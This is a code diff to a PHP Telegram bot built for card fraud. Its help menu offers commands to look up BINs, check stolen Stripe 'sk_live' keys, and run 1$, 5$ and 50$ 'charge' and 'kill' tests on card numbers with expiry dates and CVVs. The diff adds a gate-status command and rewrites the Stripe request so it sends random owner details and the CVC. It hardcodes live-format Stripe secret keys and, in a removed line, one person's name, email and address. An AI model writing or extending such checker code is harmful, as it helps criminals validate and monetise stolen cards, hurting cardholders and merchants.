@@ -83,7 +83,7 @@ sendMessage($chatId, "What's new in this version 2.0?%0A%0A<b>Re-Wirte all comma
 
 //////////=========[help Command]=========//////////
  elseif (strpos($message, "/help") === 0){
-sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_xxxxxxxxxxxxx%0A<u>charge 1$:</u> <code>/chg</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Auth:</u> <code>/aut</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Card algorithm check:</u> <code>/aut</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/web</code>%0A<u>charge 5$:</u> <code>/rap</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>kill 50$:</u> <code>/kcc</code> xxxxxxxxxxxxxxxx|xx|xx|xxx<u>%0A<u>CCN charge 1$:</u> <code>/ccn</code> xxxxxxxxxxxxxxxx|xx|xx%0A%0AInfo:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: stowe .</b>", $message_id);
+sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_xxxxxxxxxxxxx%0A<u>charge 1$:</u> <code>/chg</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Auth:</u> <code>/aut</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Card algorithm check:</u> <code>/agt</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/web</code>%0A<u>charge 5$:</u> <code>/rap</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>kill 50$:</u> <code>/kcc</code> xxxxxxxxxxxxxxxx|xx|xx|xxx<u>%0A<u>CCN charge 1$:</u> <code>/ccn</code> xxxxxxxxxxxxxxxx|xx|xx%0A<u>Random Info:</u> <code>/inf</code>Country%0A%0A<u>GPT chat:</u> <code>/gpt</code>%0A<u>check status gate:</u> <code>/sta</code>%0AInfo:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: stowe .</b>", $message_id);
 }
 //////////=========[Info Command]=========//////////
 
@@ -99,13 +99,18 @@ elseif (strpos($message, "/web") === 0){
 //////////=========[log Command]=========//////////
 
 elseif (strpos($message, "/log") === 0){
- sendMessage($chatId, "What's new in this version 2.0 <code>(DEBUG VERSION)</code> ?%0A%0A<b>Re-Wirte all command</b>%0A%0A<b>Remove not working command</b>%0A%0A<b>receipt url added</b>%0A%0A<b>Fix Ris kcore not working </b>%0A%0A<b> CCN CHAGRES </b>%0A", $message_id);
+ sendMessage($chatId, "What's new in this version 2.2?%0A%0A<b>Re-Wirte all command</b>%0A%0A<b>Remove not working command</b>%0A%0A<b>receipt url added</b>%0A%0A<b>Fix Ris kcore not working </b>%0A%0A<b> CCN CHAGRES </b>%0A", $message_id);
 }
   
 //////////=========[debg Command]=========//////////
 
 elseif (strpos($message, "/ran") === 0){
   sendMessage($chatId, "".$selected_line1_trim."|".$selected_line2_trim."|".$selected_line3."", $message_id);
+ }
+ //////////=========[Status Command]=========//////////
+
+elseif (strpos($message, "/sta") === 0){
+  sendMessage($chatId, "<b>/aut:</b>ON✅%0A<b>/chg:</b>⚠️NOT ENABLED%0A<b>/ccn:</b>❌GATE DEAD%0A<b>/agt:</b>ON✅%0A<b>/rap:</b>❌GATE DEAD%0A<b>/kcc:</b>❌GATE DEAD", $message_id);
  }
 //////////=========[Random Info]=========//////////
 
@@ -187,14 +192,13 @@ elseif (strpos($message, "/sk") === 0){
     }else{
     sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
     };}
-//=====================[gpt]=============================//
-
+//=====================[GPT command]=============================//
 elseif (strpos($message, "/gpt") === 0){
   $text = substr($message, 5);
   $data = '{
     "model": "text-davinci-003",
     "prompt": "'.$text.'",
-    "max_tokens": 100,
+    "max_tokens": 300,
     "temperature": 0
   }';
 
@@ -214,11 +218,10 @@ $text = trim($result);
 
 sendMessage($chatId, "$text", $message_id);
 }
-
 //////////=========[aut Command]=========//////////
 elseif (strpos($message, "/aut") === 0){
   $skeys = array(
-      1 => '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', // Enter at least one sk key
+      1 => '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', // Enter at least one sk key
     //2 => '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',-----------------|
     //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
     //4 => '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',                 |
@@ -847,7 +850,7 @@ elseif (strpos($message, "/ccn") === 0){
           curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
           curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
           curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
-          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
           $result1 = curl_exec($ch);
           $tok1 = Getstr($result1,'"id": "','"');
           $msg1 = Getstr($result1,'"message": "','"');
